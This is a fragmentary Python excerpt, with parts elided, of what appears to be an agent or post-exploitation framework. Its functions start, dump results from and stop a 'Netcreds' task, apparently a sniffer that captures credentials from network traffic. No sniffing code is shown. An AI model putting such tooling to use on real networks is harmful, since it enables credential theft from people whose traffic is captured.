...
def netcreds_start(interface=None, filterip=None, listWinInterfaces=False):
    if ghost.agent.manager.active(Netcreds):
        return False

    try:
        ghost.agent.manager.create(
...
def netcreds_dump():
    nc = ghost.agent.manager.get(Netcreds)
    if nc:
        return nc.results
...
def netcreds_stop():
    nc = ghost.agent.manager.get(Netcreds)
    if nc:
        ghost.agent.manager.stop(Netcreds)
        return nc.results

############## Main class ##############

class Netcreds(ghost.Task):
